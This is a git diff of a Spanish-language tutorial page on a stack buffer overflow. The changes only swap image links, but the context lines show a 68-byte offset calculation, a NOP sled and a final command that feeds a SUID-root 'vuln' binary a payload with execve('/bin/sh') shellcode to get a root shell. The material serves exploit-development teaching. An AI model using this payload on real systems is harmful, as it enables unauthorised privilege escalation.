@@ -80,7 +80,7 @@ gcc -z execstack -g -fno-stack-protector -mpreferred-stack-boundary=2 <file> -o 
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
 #### Calcular offset
 
@@ -93,11 +93,11 @@ pattern search       # Calcular el offset
 
 Como vemos se produce un BOF al correr el programa
 
-<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
 
 Con un offset de 68 bytes:
 
-<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
 
 Ahora vamos a agregar unos nops seguido de estos vamos a pasar una shellcode que queramos ejecutar y elegir una dirección intermedia de los nops que será la que pasemos al EIP para que ejecute nuestra shellcode. Pero antes tenemos que determinar la dirección en la que están los NOP's, por lo que debemos efectuar el BOF, las "A" se repiten 68 veces debido a que generan el desbordamiento, las "B" hacen referencia al EIP y los "\x90" a los NOP's:
 
@@ -105,7 +105,7 @@ Ahora vamos a agregar unos nops seguido de estos vamos a pasar una shellcode que
 
 `run $(python -c 'print "A" * 68 + "BBBB" + "\x90" * 200 ') # en PEDA`
 
-<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
 
 Ahora debemos buscar una shellcode que nos interese y ponerla después de los NOP's, y elegir una dirección de los NOP's para decirle al EIP que salte a esta dirección,como están en formato Little Endian habrá que invertir su orden:
 
@@ -123,5 +123,5 @@ Como el archivo es del propietario root y cuenta con permisos SUID podemos eject
 ./vuln $(python -c 'print "A" * 68 + "\xc0\xf4\xff\xbf" + "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
 ```
 
-<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
 
